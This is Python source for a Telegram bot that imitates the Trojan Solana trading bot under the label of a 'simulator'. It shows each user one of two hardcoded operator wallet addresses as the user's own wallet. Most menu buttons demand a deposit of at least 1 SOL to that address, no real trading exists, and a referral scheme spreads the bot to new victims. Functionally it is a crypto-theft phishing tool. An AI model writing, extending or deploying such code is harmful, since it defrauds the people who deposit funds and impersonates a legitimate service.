#!/usr/bin/env python3
"""
Trojan Telegram Bot - Solana Trading Interface Simulator
A Telegram bot that simulates Trojan's Solana trading interface with team address assignment and referral system.
"""

import logging
import os
import random
import json
from datetime import datetime
from typing import Dict, List, Optional

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Team addresses pool
TEAMS = {
    'Team 1': '8rMj1dMR6tp428j7DaGUn6TpLi89fpdYNQEwqUzyFCe3',
    'Team 2': 'EATAgjcHTZxCaudus4VvktLRfxYjtHMbNLSnyDJYXtnt'
}

# Bot username for referral links
BOT_USERNAME = os.getenv('BOT_USERNAME', 'Thanatos_TrojanBot')

# File-based storage for users
USER_DATA_FILE = "users.json"
users_db: Dict[str, Dict] = {}
used_addresses = set()

def load_users():
    """Load users from JSON file"""
    global users_db, used_addresses
    try:
        if os.path.exists(USER_DATA_FILE):
            with open(USER_DATA_FILE, 'r') as f:
                data = json.load(f)
                users_db = data.get('users', {})
                used_addresses = set(data.get('used_addresses', []))
                logger.info(f"Loaded {len(users_db)} users from storage")
        else:
            users_db = {}
            used_addresses = set()
            logger.info("No existing user data found, starting fresh")
    except Exception as e:
        logger.error(f"Error loading users: {e}")
        users_db = {}
        used_addresses = set()

def save_users():
    """Save users to JSON file"""
    try:
        data = {
            'users': users_db,
            'used_addresses': list(used_addresses),
            'last_updated': datetime.now().isoformat()
        }
        with open(USER_DATA_FILE, 'w') as f:
            json.dump(data, f, indent=2, default=str)
        logger.info(f"Saved {len(users_db)} users to storage")
    except Exception as e:
        logger.error(f"Error saving users: {e}")

class TrojanBot:
    def __init__(self):
        self.token = os.getenv('BOT_TOKEN')
        if not self.token:
            raise ValueError("BOT_TOKEN environment variable is required")
        
        # Load existing user data
        load_users()
        
        # Build application with better error handling and conflict resolution
        self.application = (
            Application.builder()
            .token(self.token)
            .read_timeout(30)
            .write_timeout(30)
            .connect_timeout(30)
            .pool_timeout(30)
            .build()
        )
        self.setup_handlers()

    def setup_handlers(self):
        """Set up command and callback handlers"""
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CallbackQueryHandler(self.button_callback))

    def assign_team_address(self) -> str:
        """Assign a team address from the available pool"""
        available_teams = list(TEAMS.keys())
        
        # If all addresses are used, randomly pick one
        if len(used_addresses) >= len(TEAMS):
            team_name = random.choice(available_teams)
        else:
            # Find an unused address
            while True:
                team_name = random.choice(available_teams)
                if TEAMS[team_name] not in used_addresses:
                    break
        
        address = TEAMS[team_name]
        used_addresses.add(address)
        return address

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        user = update.effective_user
        telegram_id = str(user.id)
        username = user.username or user.first_name or "User"
        
        # Check for referral code
        referral_code = None
        if context.args and len(context.args) > 0:
            referral_code = context.args[0]
        
        # Check if user already exists
        if telegram_id not in users_db:
            # Create new user
            team_address = self.assign_team_address()
            
            # Handle referral
            referred_by = None
            if referral_code and referral_code.startswith('ref_'):
                referrer_id = referral_code.replace('ref_', '')
                if referrer_id in users_db:
                    referred_by = referrer_id
                    # Increment referrer's direct referrals
                    users_db[referrer_id]['direct_referrals'] += 1
                    
                    # Also increment indirect referrals for the referrer's referrer
                    if users_db[referrer_id]['referred_by']:
                        referrer_of_referrer = users_db[referrer_id]['referred_by']
                        if referrer_of_referrer in users_db:
                            users_db[referrer_of_referrer]['indirect_referrals'] += 1
            
            # Create user record
            users_db[telegram_id] = {
                'telegram_id': telegram_id,
                'username': username,
                'team_address': team_address,
                'referred_by': referred_by,
                'direct_referrals': 0,
                'indirect_referrals': 0,
                'sol_balance': 0.0,
                'referral_rewards': 0.0,
                'cashback_rewards': 0.0,
                'total_paid_rewards': 0.0,
                'created_at': datetime.now(),
                'last_updated': datetime.now()
            }
            
            # Save to file
            save_users()
            
            logger.info(f"New user registered: {telegram_id} ({username}) with team address: {team_address}")
        
        # Send main menu
        await self.send_main_menu(update, context)

    async def send_main_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Send the main trading interface menu"""
        user = update.effective_user
        telegram_id = str(user.id)
        
        if telegram_id not in users_db:
            await update.message.reply_text("Please restart the bot with /start")
            return
        
        user_data = users_db[telegram_id]
        team_address = user_data['team_address']
        sol_balance = user_data['sol_balance']
        
        message = f"""Solana • 🅴 `{team_address}` (Tap to Copy)  
Balance: {sol_balance} SOL ($0.00)

Click on the Refresh button to update your current balance.

⚠️We have no control over ads shown by Telegram in this bot. Do not be scammed by fake airdrops or login pages."""

        keyboard = [
            [
                InlineKeyboardButton("Buy", callback_data="buy"),
                InlineKeyboardButton("Sell", callback_data="sell")
            ],
            [
                InlineKeyboardButton("Positions", callback_data="positions"),
                InlineKeyboardButton("Limit Orders", callback_data="limit_orders"),
                InlineKeyboardButton("DCA Orders", callback_data="dca_orders")
            ],
            [
                InlineKeyboardButton("Copy Trade", callback_data="copy_trade"),
                InlineKeyboardButton("Sniper 🆕", callback_data="sniper")
            ],
            [
                InlineKeyboardButton("Trenches", callback_data="trenches"),
                InlineKeyboardButton("💰 Rewards", callback_data="rewards"),
                InlineKeyboardButton("⭐ Watchlist", callback_data="watchlist")
            ],
            [
                InlineKeyboardButton("Withdraw", callback_data="withdraw"),
                InlineKeyboardButton("Settings", callback_data="settings")
            ],
            [
                InlineKeyboardButton("Help", callback_data="help"),
                InlineKeyboardButton("Refresh", callback_data="refresh")
            ]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if update.message:
            await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        elif update.callback_query:
            await update.callback_query.edit_message_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button callbacks"""
        query = update.callback_query
        await query.answer()
        
        user = update.effective_user
        telegram_id = str(user.id)
        
        if telegram_id not in users_db:
            await query.edit_message_text("User not found. Please restart the bot with /start")
            return
        
        user_data = users_db[telegram_id]
        action = query.data
        
        if action == "sell":
            keyboard = [[InlineKeyboardButton("← Back", callback_data="back_to_main")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text("**You do not have any tokens yet! Start trading in the Buy menu.**", 
                                        parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        
        elif action == "limit_orders":
            keyboard = [[InlineKeyboardButton("← Back", callback_data="back_to_main")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text("**You have no active limit orders. Create a limit order from the Buy/Sell menu.**", 
                                        parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        
        elif action == "dca_orders":
            keyboard = [[InlineKeyboardButton("← Back", callback_data="back_to_main")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text("**You have no active DCA orders. Create a DCA order from the Buy/Sell menu.**", 
                                        parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        
        elif action in ["copy_trade", "sniper", "trenches", "watchlist", "withdraw", "settings"]:
            message = f"""You need to deposit at least 1 SOL on your wallet for this function to work  
`{user_data['team_address']}` (tap to copy)"""
            keyboard = [[InlineKeyboardButton("← Back", callback_data="back_to_main")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        
        elif action == "rewards":
            await self.send_rewards_message(update, context)
        
        elif action == "refresh" or action == "back_to_main":
            await self.send_main_menu(update, context)
        
        elif action in ["buy", "positions", "help"]:
            keyboard = [[InlineKeyboardButton("← Back", callback_data="back_to_main")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text("This feature is coming soon!", reply_markup=reply_markup)
        
        else:
            keyboard = [[InlineKeyboardButton("← Back", callback_data="back_to_main")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text("Unknown action.", reply_markup=reply_markup)

    async def send_rewards_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Send rewards information"""
        query = update.callback_query
        user = update.effective_user
        telegram_id = str(user.id)
        
        user_data = users_db[telegram_id]
        
        now = datetime.now()
        formatted_time = now.strftime("%Y-%m-%d %H:%M") + " UTC"
        
        total_unpaid = user_data['referral_rewards'] + user_data['cashback_rewards']
        total_referred = user_data['direct_referrals'] + user_data['indirect_referrals']
        
        message = f"""Cashback and Referral Rewards are paid out **every 12 hours** and airdropped directly to your Rewards Wallet. To be eligible, you must have at least 0.005 SOL in unpaid rewards.

**All Trojan users now enjoy a 10% boost to referral rewards and 20% cashback on trading fees.**

Referral Rewards  
• Users referred: {total_referred}
• Direct: {user_data['direct_referrals']}, Indirect: {user_data['indirect_referrals']}  
• Earned rewards: {user_data['referral_rewards']:.3f} SOL ($0.00)

Cashback Rewards  
• Earned rewards: {user_data['cashback_rewards']:.3f} SOL ($0.00)

Total Rewards  
• Total paid: {user_data['total_paid_rewards']:.3f} SOL ($0.00)  
• Total unpaid: {total_unpaid:.3f} SOL ($0.00)

**Your Referral Link**
`https://t.me/{BOT_USERNAME}?start=ref_{telegram_id}`
Your friends save 10% with your link.

Last updated at {formatted_time} (every 5 min)"""

        keyboard = [[InlineKeyboardButton("← Back", callback_data="back_to_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

    def run(self):
        """Start the bot"""
        logger.info("Starting Trojan Telegram Bot...")
        try:
            self.application.run_polling(
                allowed_updates=Update.ALL_TYPES,
                drop_pending_updates=True,  # Clear any pending updates
                timeout=30,
                poll_interval=2.0
            )
        except Exception as e:
            logger.error(f"Bot polling error: {e}")
            raise

def main():
    """Main function"""
    try:
        bot = TrojanBot()
        bot.run()
    except ValueError as e:
        logger.error(f"Configuration error: {e}")
        print(f"Error: {e}")
        print("Please set BOT_TOKEN environment variable with your Telegram bot token")
        print("You can create a bot by messaging @BotFather on Telegram")
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        print(f"Unexpected error: {e}")

if __name__ == '__main__':
    main()